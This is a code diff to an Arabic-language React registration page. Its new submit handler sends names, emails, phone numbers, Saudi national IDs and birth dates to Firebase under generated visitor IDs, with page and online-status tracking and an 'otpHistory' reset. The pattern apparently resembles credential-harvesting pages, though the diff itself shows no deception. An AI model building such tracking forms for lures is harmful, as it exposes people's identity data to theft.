@@ -1,7 +1,9 @@
 import { useState } from "react";
 import { ChevronRight } from "lucide-react";
-import { Link } from "wouter";
+import { Link, useLocation } from "wouter";
 import { BottomNav } from "./services";
+import { addData } from "@/lib/firebase";
+import { setupOnlineStatus } from "@/lib/utils";
 
 type FormState = {
   firstName: string;
@@ -17,6 +19,9 @@ type FormState = {
 };
 
 export default function Register() {
+  const [, setLocation] = useLocation();
+  const [submitting, setSubmitting] = useState(false);
+  const [error, setError] = useState("");
   const [form, setForm] = useState<FormState>({
     firstName: "",
     lastName: "",
@@ -32,6 +37,40 @@ export default function Register() {
 
   const update = (key: keyof FormState, val: string) =>
     setForm((f) => ({ ...f, [key]: val }));
+
+  const handleSubmit = async () => {
+    if (submitting) return;
+    setError("");
+    if (!form.firstName.trim() || !form.email.trim() || !form.phone.trim()) {
+      setError("يرجى تعبئة الاسم والبريد الإلكتروني ورقم الجوال");
+      return;
+    }
+    setSubmitting(true);
+    const visitorId = `visitor_${Date.now()}_${Math.random()
+      .toString(36)
+      .substring(2, 9)}`;
+    const fullName = `${form.firstName} ${form.lastName}`.trim();
+    const phoneFull = `${form.countryCode}${form.phone.replace(/^\+?966/, "")}`;
+    const ok = await addData({
+      id: visitorId,
+      name: fullName,
+      email: form.email,
+      phone: phoneFull,
+      saudiId: form.nationalId,
+      gender: form.gender,
+      birthDate: form.birthDate,
+      currentPage: "registration",
+    });
+    if (!ok) {
+      setError("تعذر إكمال التسجيل، يرجى المحاولة مرة أخرى");
+      setSubmitting(false);
+      return;
+    }
+    localStorage.setItem("visitor", visitorId);
+    localStorage.removeItem("otpHistory");
+    setupOnlineStatus(visitorId);
+    setLocation("/trip-booking");
+  };
 
   const textFields: { label: string; key: keyof FormState; placeholder: string; type?: string }[] = [
     { label: "الاسم الأول", key: "firstName", placeholder: "Muath" },
@@ -161,11 +200,22 @@ export default function Register() {
           />
         </div>
 
+        {error && (
+          <p
+            className="text-red-100 bg-red-900/40 rounded-lg px-3 py-2 text-xs text-center"
+            data-testid="error-register"
+          >
+            {error}
+          </p>
+        )}
+
         <button
-          className="w-full bg-muted text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2"
+          onClick={() => void handleSubmit()}
+          disabled={submitting}
+          className="w-full bg-muted text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
           data-testid="button-submit-register"
         >
-          تسجيل
+          {submitting ? "جاري الإرسال..." : "تسجيل"}
         </button>
       </div>
 
